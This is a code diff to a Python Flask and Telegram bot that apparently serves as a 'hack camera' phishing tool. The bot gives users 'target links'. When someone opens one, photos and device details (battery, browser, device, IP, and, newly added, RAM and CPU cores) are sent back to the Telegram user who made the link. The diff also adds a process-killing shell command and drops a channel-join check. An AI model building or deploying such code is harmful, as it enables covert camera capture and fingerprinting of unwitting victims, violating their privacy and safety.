@@ -1,10 +1,18 @@
-import os, base64, threading, sqlite3, time, telebot
+import os, base64, threading, sqlite3, time, telebot, signal
 from flask import Flask, render_template, request, jsonify
 from telebot import types
 
+def kill_old_processes():
+    try:
+        current_pid = os.getpid()
+        os.system(f"pgrep -f app.py | grep -v {current_pid} | xargs kill -9")
+    except:
+        pass
+
+kill_old_processes()
+
 app = Flask(__name__)
 
-# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 APP_URL = "https://happy-wishing-you.onrender.com" 
 ADMINS = [518067190, 7162565886]
@@ -16,9 +24,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 def db_init():
     conn = sqlite3.connect('users.db')
     cursor = conn.cursor()
-    # Adding photo_count column to track per user activity
     cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
-    # Global stats table
     cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
     cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
     conn.commit()
@@ -29,16 +35,14 @@ db_init()
 def is_user_joined(user_id):
     try:
         member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            return True
-        return False
+        return member.status in ['member', 'administrator', 'creator']
     except:
         return False
 
 @bot.message_handler(commands=['start'])
 def start(message):
     conn = sqlite3.connect('users.db'); cursor = conn.cursor()
-    cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?, 0)', (message.chat.id,))
+    cursor.execute('INSERT OR IGNORE INTO users (id, photo_count) VALUES (?, 0)', (message.chat.id, 0))
     conn.commit(); conn.close()
 
     if is_user_joined(message.chat.id):
@@ -59,15 +63,13 @@ def show_camera_menu(chat_id):
     markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
     bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)
 
-# --- ADMIN COMMANDS ---
-
 @bot.message_handler(commands=['stats'])
 def total_stats(message):
     if message.chat.id in ADMINS:
         conn = sqlite3.connect('users.db'); cursor = conn.cursor()
         cursor.execute('SELECT total_photos FROM stats WHERE id = 1')
         total = cursor.fetchone()[0]
-        bot.reply_to(message, f"📊 <b>Total Photos Received:</b> {total}", parse_mode='HTML')
+        bot.reply_to(message, f"📊 <b>Total Photos:</b> {total}", parse_mode='HTML')
 
 @bot.message_handler(commands=['users'])
 def user_list(message):
@@ -77,7 +79,7 @@ def user_list(message):
         rows = cursor.fetchall()
         response = "👥 <b>User Activity List:</b>\n\n"
         for row in rows:
-            response += f"👤 ID: <code>{row[0]}</code> | 📸 Photos: {row[1]}\n"
+            response += f"👤 ID: <code>{row[0]}</code> | 📸: {row[1]}\n"
         bot.reply_to(message, response, parse_mode='HTML')
 
 @bot.message_handler(commands=['broadcast'])
@@ -86,20 +88,17 @@ def broadcast(message):
         msg_parts = message.text.split(None, 1)
         msg_text = msg_parts[1] if len(msg_parts) > 1 else ""
         if not msg_text:
-            bot.reply_to(message, "Usage: /broadcast [Your Message]")
+            bot.reply_to(message, "Usage: /broadcast [Message]")
             return
         conn = sqlite3.connect('users.db'); cursor = conn.cursor()
         cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
-        success = 0
+        count = 0
         for user in users:
             try:
                 bot.send_message(user[0], msg_text)
-                success += 1
-                time.sleep(0.1)
+                count += 1
             except: pass
-        bot.send_message(message.chat.id, f"📢 Broadcast Sent to {success} users.")
-
-# --- END ADMIN COMMANDS ---
+        bot.send_message(message.chat.id, f"📢 Sent to {count} users.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -114,9 +113,7 @@ def callback_query(call):
         if is_user_joined(user_id):
             mode = call.data.replace("m_", "")
             target_link = f"{APP_URL}/?m={mode}&uid={user_id}"
-            bot.send_message(user_id, f"<b>🤠 Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
-        else:
-            bot.answer_callback_query(call.id, "⚠️ Please join the channel first.", show_alert=True)
+            bot.send_message(user_id, f"<b>🤠 It's Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
@@ -131,11 +128,12 @@ def upload():
         caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                    f"🔋 <b>Battery:</b> {info.get('battery', 'N/A')}\n"
                    f"🌐 <b>Browser:</b> {info.get('browser', 'N/A')}\n"
+                   f"🧠 <b>RAM:</b> {info.get('ram', 'N/A')}\n"
+                   f"⚙️ <b>CPU:</b> {info.get('cores', 'N/A')} Cores\n"
                    f"📱 <b>Device:</b> {info.get('device', 'N/A')}\n"
                    f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                    f"✨ Created by Roshan ✨")
         
-        # Updating database counters
         conn = sqlite3.connect('users.db'); cursor = conn.cursor()
         cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
         cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (data.get('uid'),))
@@ -154,4 +152,4 @@ if __name__ == "__main__":
             except: time.sleep(5)
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-    
+        
